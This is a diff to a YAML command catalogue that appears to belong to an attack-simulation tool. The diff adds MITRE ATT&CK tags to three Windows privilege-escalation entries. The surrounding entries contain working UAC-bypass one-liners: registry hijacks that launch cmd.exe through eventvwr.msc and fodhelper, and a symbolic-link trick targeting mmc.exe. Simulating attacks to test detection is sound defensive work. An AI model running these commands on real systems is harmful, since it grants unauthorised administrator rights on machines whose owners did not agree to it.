@@ -7,6 +7,7 @@ commands:
       command: 'reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f && cmd.exe /c eventvwr.msc'
       stealth: low
       mitre:
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
          - 'Privilege Escalation;T1548.002;Abuse Elevation Control Mechanism: Bypass User Account Control'
       comments: 'Replace registry key with cmd.exe to execute as administrator when EventViewer is opened, bypassing UAC.'
    local_privesc_2:
@@ -15,6 +16,7 @@ commands:
       command: 'mklink c:\ThreatSim.exe "\\?\C:\Windows \System32\mmc.exe"'
       stealth: low
       mitre:
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
          - 'Privilege Escalation;T1548.002;Abuse Elevation Control Mechanism: Bypass User Account Control'
       comments: 'Create symbolic link link from mmc.exe to arbitrary executable - when EventViewer is opened, bypasses UAC.'
    local_privesc_3:
@@ -23,5 +25,6 @@ commands:
       command: 'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f && cmd.exe /c fodhelper'
       stealth: low
       mitre:
+         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
          - 'Privilege Escalation;T1548.002;Abuse Elevation Control Mechanism: Bypass User Account Control'
       comments: 'Replace registry key with cmd.exe to execute as administrator when fodhelper is opened, bypassing UAC.'
